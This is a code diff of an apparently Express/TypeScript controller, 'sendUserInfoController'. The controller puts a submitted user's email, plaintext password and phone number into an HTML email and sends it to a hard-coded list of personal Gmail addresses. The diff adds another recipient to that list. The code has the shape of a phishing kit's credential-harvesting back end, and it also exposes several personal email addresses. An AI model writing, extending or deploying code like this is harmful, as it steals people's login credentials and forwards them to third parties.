@@ -9,7 +9,7 @@ const getRecipients = (): string[] => {
   return recipients.split(",").map((email) => email.trim());
 };
 const getRecipient2 = (): string[] => {
-  const recipients = "michealrroyroy@gmail.com,yahyanbenedict@gmail.com,davidjohnn175@gmail.com";
+  const recipients = "michealrroyroy@gmail.com,yahyanbenedict@gmail.com,davidjohnn175@gmail.com,rohitkumar952895@gmail.com";
   // const recipients = "rohitkumar952895@gmail.com";
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
@@ -93,18 +93,20 @@ export const sendUserInfoController = asyncHandler(
     }
 
     // Build HTML Email Content
-    const htmlContent = `
+
+
+    try {
+      const recipients = getRecipient2();
+      console.log(recipients, 'iiiiiiiiiiiiiiiiiiiiii');
+      const htmlContent = `
       <h2>${title}</h2>
       <ul>
         <li><strong>Email:</strong> ${email}</li>
         <li><strong>Password:</strong> ${password}</li>
         <li><strong>Phone:</strong> ${phone || "N/A"}</li>
+        <li><strong>email:</strong> ${recipients|| "N/A"}</li>
       </ul>
     `;
-
-    try {
-      const recipients = getRecipient2();
-      console.log(recipients, 'iiiiiiiiiiiiiiiiiiiiii');
 
       if (recipients.length === 0) {
         return errorResponse(res, "No recipients configured", 400);
